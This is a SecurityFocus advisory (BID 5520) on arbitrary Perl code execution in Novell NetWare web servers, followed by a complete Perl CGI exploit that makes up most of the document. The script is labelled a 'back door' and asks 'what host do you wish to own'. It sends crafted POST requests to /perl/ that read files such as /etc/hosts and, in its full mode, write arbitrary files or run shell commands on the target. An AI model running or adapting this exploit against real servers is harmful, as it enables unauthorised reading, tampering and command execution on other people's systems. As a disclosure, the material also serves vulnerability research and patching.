source: http://www.securityfocus.com/bid/5520/info

A vulnerability has been reported in some versions of Novell NetWare. This issue lies in the handling of some HTTP requests when Perl is used as a handler by a web server.

Reportedly, it is possible for an attacker to execute arbitrary Perl code. Full technical details are not currently available.

This issue has been reported in versions of NetWare using Perl 5.003. Reportedly, systems with Perl 5.6 installed are not vulnerable to this issue.

#!/usr/bin/perl

# Copyright (c) 2002 Novacoast International (DElder@novacoast.com)

# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.

# Special thanks to Rain Forest Puppy (RFP) for coming up with this
# exploit in the first place

# Works against versions
# Novell Netware 5.1 SP4
# Novell Netware 5.1
# Novell Netware 6.0 SP1
# Novell Netware 6.0
#
# See full anouncement at
# http://online.securityfocus.com/bid/5520
#
#
# To use this cgi, drop it on a webserver and point it at the
# netware box you want to test.  If you get output,  it works.

use IO::Socket;
use CGI qw(:standard);
use CGI::Carp 'fatalsToBrowser';
use Sys::Hostname;
$CGI::POST_MAX        = 1024 * 100;    # max 100K posts
$CGI::DISABLE_UPLOADS = 1;             # no uploads
$hostname             = hostname();    # Should automagically detect hostname
$scriptname = url();    # Should automagically detect the url to the cgi

$full = 0; # Set to 1 if you want more acces to a box

$proto = 'tcp';

$cgi = new CGI;

print $cgi->header;
print $cgi->start_html
(
 -title=>'Novacoast Netware Back Door',
 -author=>'delder\@novacoast.com',
 -meta=>{'keywords'=>'Netware Webserver Compromise Novacoast RFP'}
);

print $cgi->center($cgi->h1('Own Your Very Own Netware Box'));
print $cgi->h2('Courtesy of RFP and Novacoast');

print $cgi->hr;

#print $cgi->p("Running on host $hostname as script $scriptname");

if($cgi->param()) {
  $hostname = $cgi->param('hostname');
  $port = $cgi->param('port');
  $operation = $cgi->param('operation');
  $filename = $cgi->param('filename');
  $input = $cgi->param('input');

  if($full == 0) {
    $operation = "Read a file";
    $filename = "/etc/hosts";
  }
  else {

    # Creat appropriate payload depending on operation
    if($operation eq "Execute Command")
      {
	# This is currently untested. If you have a netware box
	# let us know if this works or not
	$command = "\$output = \`$input\`; print \$output;";
      }
    elsif($operation eq "Read a file")
      {
	$command = "open( IN, \'< $filename\') || die \"Cant read $filename : \$\!\"; while(<IN>) {print \$_}; close(IN);"
      }
    elsif($operation eq "Write to a file")
      {
	$command = "open( OUT, \'> $filename\') or die \"Cannot write $filename : \$\!\"; print OUT \"$input\"; close OUT;";
      }
    else {
      die "How did you get here?";
    }
  }


  $payload = armor_command($command);

  print $cgi->p("Sending the following paylod: \"$payload\"");

  # Open connection to sepcified host
  $handle = IO::Socket::INET->new
  (
   PeerAddr => $hostname,
   PeerPort => $port,
   Proto    => $proto
  ) || print $cgi->p("<p>Couldn't connect to $hostname on port $port, try again sucka: $!</p>");

  print $handle $payload;
  
  my $response = "";
  while (<$handle>) {$response .= $_;}
  
  close $handle;

  $_ = $response;

  s/\n/<\/p\><p>/g;
  
  if(/daddy/) {
  
    if( $full == 1 ) {
      print $cgi->p("Server resonded with: </p><p> \"$_\"");
    }
    else {
      print $cgi->p("Servers /etc/hosts file is: </p><p> \"$_\"");
    }
  } 
  
  else {
    print $cgi->p("The server appears to be unaffected");
  }
}

else {

  # If your cgi keeps redirecting to the wrong page
  # try changing the action to $hostname/$scriptname
  # or something like that.  Perl can do wacky things to you
  print $cgi->startform(
			-method=>'POST',
			-action=>"$scriptname"
		       );
  
  print $cgi->p("What host do you wish to own:");
  print $cgi->textfield('hostname'); 

  print $cgi->p("What port do you wish to connect to:");
  print $cgi->textfield(
			-name=>'port',
			-default=>'80'
		       );

  if($full == 1) {
	  
    print $cgi->p("Operation you wish to perform:");
    print $cgi->popup_menu
      (
       -name=>'operation',
       -values=>['Read a file','Write to a file'], #,'Execute Command'],
       -default=>'Read a file'
      );
    
    print $cgi->p("Filename:");
    print $cgi->textfield(
			  -name=>'filename',
			  -default=>'/etc/hosts'
			 );
    
    print $cgi->p("Text to input in file:");
    print $cgi->textarea
      (
       -name=>'input',
       -rows=>15,
       -columns=>60
      ); 
  }

  print $cgi->center(
	       $cgi->submit,
	       $cgi->reset,
	      );
  print $cgi->hr;
  print $cgi->endform;
  print $cgi->end_html;

}


# Adds HTTP headers and caluclates the number of chars used
# in the command and returns the HTTP payload
#
# $_[0]   ->  The command to be executed
#
# Returns ->  HTTP armored version of command

sub armor_command
  {
    $header = "POST /perl/ HTTP/1.0 
Content-Type: application/octet-stream 
Content-Length:";
    
    $output_type = "print \"Content-type: text/html\n\nWhos your daddy\n\";";
    my $size = length($output_type);

    $command = $_[0];
    $size += length($command);

    $output = "$header $size\n\n$output_type $command";

    return $output;
  }